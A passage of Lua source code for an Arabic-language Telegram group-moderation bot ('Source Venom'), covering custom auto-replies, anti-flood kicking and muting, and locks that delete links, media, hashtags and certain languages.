DevAbs:srem(Venom..'Abs:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAbs:get(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAbs:del(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevAbs:srem(Venom..'Abs:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAbs:get(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAbs:del(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(Venom..'Abs:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevAbs:srem(Venom..'Abs:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevAbs:get(Venom.."Abs:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAbs:del(Venom.."Abs:Add:AllRed"..msg.sender_user_id_)
DevAbs:del(Venom.."Abs:Gif:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:Voice:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:Audio:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:Photo:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:Stecker:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:Video:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:File:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:Text:AllRed"..msg.content_.text_)
DevAbs:del(Venom.."Abs:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source Venom     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevAbs:get(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevAbs:get(Venom..'Abs:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevAbs:smembers(Venom..'Abs:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙𖠧︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevAbs:del(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevAbs:del(Venom..'Abs:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevAbs:srem(Venom..'Abs:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevAbs:sadd(Venom..'Abs:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ ↫ 5 من الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevAbs:del(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
local Abs = "𖠧︙تم حفظ الرد رقم ↫ "..(#List+1).."\n𖠧︙قم بارسال الرد رقم ↫ "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="انهاء وحفظ "..(#List+1).." من الردود",callback_data="/EndRedod:"..msg.sender_user_id_..GetGpTexts}},{{text="الغاء وحذف التخزين",callback_data="/DelRedod:"..msg.sender_user_id_..GetGpTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Abs).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
if text and not DevAbs:get(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevAbs:sismember(Venom..'Abs:Manager:GpRedod'..msg.chat_id_,text) then
local VenomTEAM =  DevAbs:smembers(Venom..'Abs:Text:GpTexts'..text..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '['..VenomTEAM[math.random(#VenomTEAM)]..']' , 1, 'md')  
end
end
--     Source Venom     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevAbs:get(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevAbs:get(Venom..'DelManagerRep'..msg.chat_id_)
DevAbs:srem(Venom..'Abs:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(Venom..'Abs:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(Venom..'DelManagerRep'..msg.chat_id_)
return false
end
DevAbs:del(Venom..'Abs:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevAbs:get(Venom..'Abs:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevAbs:set(Venom..'Abs:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevAbs:set(Venom..'Abs:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevAbs:set(Venom..'Abs:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAbs:set(Venom..'Abs:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevAbs:set(Venom..'Abs:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(Venom..'Abs:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevAbs:set(Venom..'Abs:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAbs:set(Venom..'Abs:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ الرد الجديد', 1, 'md') 
DevAbs:del(Venom..'Abs:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(Venom..'DelManagerRep'..msg.chat_id_)
return false 
end 
end
if msg.content_.text_ and not DevAbs:get(Venom..'Abs:Lock:GpRed'..msg.chat_id_) then 
if DevAbs:get(Venom..'Abs:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Venom..'Abs:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbs:get(Venom..'Abs:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Venom..'Abs:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbs:get(Venom..'Abs:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom..'Abs:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbs:get(Venom..'Abs:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom..'Abs:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbs:get(Venom..'Abs:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom..'Abs:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAbs:get(Venom..'Abs:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom..'Abs:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAbs:get(Venom..'Abs:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Venom..'Abs:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevAbs:get(Venom..'Abs:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function VenomTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbs:get(Venom..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(Venom..'Abs:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, VenomTEAM)
end
end
--     Source Venom     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevAbs:get(Venom.."Abs:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevAbs:get(Venom..'DelSudoRep')
DevAbs:del(Venom.."Abs:Sudo:AllRed",DelSudoRep)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(Venom.."Abs:Add:AllText"..msg.sender_user_id_)
DevAbs:del(Venom.."Abs:Add:AllRed"..msg.sender_user_id_)
DevAbs:del(Venom.."DelSudoRep")
return false
end
DevAbs:del(Venom.."Abs:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevAbs:get(Venom.."Abs:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(Venom.."Abs:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevAbs:set(Venom.."Abs:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevAbs:set(Venom.."Abs:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAbs:set(Venom.."Abs:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAbs:set(Venom.."Abs:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(Venom.."Abs:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevAbs:set(Venom.."Abs:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAbs:set(Venom.."Abs:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ الرد الجديد', 1, 'md') 
DevAbs:del(Venom.."Abs:Add:AllText"..msg.sender_user_id_)
DevAbs:del(Venom..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevAbs:get(Venom..'Abs:Lock:AllRed'..msg.chat_id_) then
if DevAbs:get(Venom.."Abs:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Venom.."Abs:Video:AllRed"..msg.content_.text_))
end
if DevAbs:get(Venom.."Abs:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Venom.."Abs:File:AllRed"..msg.content_.text_))
end
if DevAbs:get(Venom.."Abs:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom.."Abs:Voice:AllRed"..msg.content_.text_))
end
if DevAbs:get(Venom.."Abs:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom.."Abs:Audio:AllRed"..msg.content_.text_))
end
if DevAbs:get(Venom.."Abs:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom.."Abs:Photo:AllRed"..msg.content_.text_))
end
if  DevAbs:get(Venom.."Abs:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Venom.."Abs:Gif:AllRed"..msg.content_.text_))
end
if DevAbs:get(Venom.."Abs:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Venom.."Abs:Stecker:AllRed"..msg.content_.text_))
end
if DevAbs:get(Venom.."Abs:Text:AllRed"..msg.content_.text_) then
function VenomTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAbs:get(Venom..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(Venom.."Abs:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, VenomTEAM)
end
end 
--     Source Venom     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '𖠧︙العضو ↫ '..GetName..' \n𖠧︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevAbs:sismember(Venom..'Abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '𖠧︙العضو ↫ '..GetName..' \n𖠧︙قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevAbs:sadd(Venom..'Abs:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '𖠧︙العضو ↫ '..GetName..' \n𖠧︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions Venom --
--     Source Venom     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Venom then
floods = DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevAbs:get(Venom.."Abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevAbs:setex(Venom.."Abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source Venom     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(Venom) then
DevAbs:set(Venom..'Abs:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevAbs:get(Venom..'Abs:PinnedMsg'..msg.chat_id_)
if pin_id and DevAbs:get(Venom..'Abs:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevAbs:get(Venom..'Abs:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevAbs:del(Venom..'Abs:viewget'..msg.sender_user_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
DevAbs:del(Venom..'Abs:viewget'..msg.sender_user_id_)
end
end
--     Source Venom     --
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevAbs:get(Venom..'Abs:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Venom     --
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevAbs:get(Venom..'Abs:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Venom     --
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevAbs:get(Venom..'Abs:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevAbs:get(Venom..'Abs:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevAbs:get(Venom..'Abs:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevAbs:get(Venom..'Abs:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
